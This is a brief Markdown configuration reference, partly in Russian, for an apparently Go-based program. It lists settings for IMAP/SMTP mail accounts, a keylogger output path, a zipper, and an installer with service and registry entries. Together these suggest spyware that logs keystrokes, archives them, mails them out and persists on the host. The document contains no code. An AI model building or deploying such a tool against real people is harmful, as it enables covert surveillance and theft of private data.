## Configuration

Описание конфигурации

### TOC

- [Configuration](#configuration)
  - [TOC](#toc)
  - [General](#general)
  - [Struct](#struct)

### General

Общие настройки приложения

* `config/config.go`

### Struct

Структура конфига

```
- service
  - name <string>
  - id <string>
- logger
  - path <string>
  - level <number>
- mail
  - imap
    - username <string>
    - password <string>
    - host <string>
    - port <number>
    - incomingBox <string>
    - checkInterval
  - smtp
    - username <string>
    - password <string>
    - host <string>
    - port <number>
    - name <string>
    - from <string>
    - subject <string>
- keylogger
  - path <string>
- zipper
  - path <string>
- installer
	- servicePath <string>
  - regPath <string>
  - regName <string>
```